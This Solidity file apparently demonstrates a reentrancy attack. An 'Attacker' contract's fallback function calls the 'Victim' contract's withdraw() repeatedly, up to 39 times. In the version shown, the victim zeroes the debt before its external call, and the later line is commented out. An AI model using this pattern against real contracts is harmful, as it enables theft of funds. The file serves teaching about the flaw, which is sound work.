pragma solidity ^0.4.8;

contract Victim {
    
    uint public owedToAttacker;
    
    event LogDeposit (uint balance);
    
    function Victim(){
        owedToAttacker = 11;
    }
    
    function withdraw(){
        uint amount = owedToAttacker;
        owedToAttacker = 0;
        if(!msg.sender.call.value(amount)()) throw; 
        //owedToAttacker = 0;
    }
   
   function showBalance() public  returns (uint) {
        return  this.balance / 1000000000000000000;
    }
    
    //depoist tome funds to work here in the
    function deposit() payable {
        LogDeposit(this.balance / 1000000000000000000);
    }
}


contract Attacker{
    
    Victim v;
    uint  public count;
    
    event LogFallBack(uint count, uint balance);
    
   
    function Attacker(address victim) payable {
         v = Victim(victim);
    }
    
    function attack(){
        v.withdraw();
    }
    
    function showBalanceInWei() public  returns (uint) {
        return  this.balance;
    }
    
    
    function () payable {
        count ++;
        LogFallBack(count, this.balance);
        
        if(count < 39)  v.withdraw();
    }
    
}
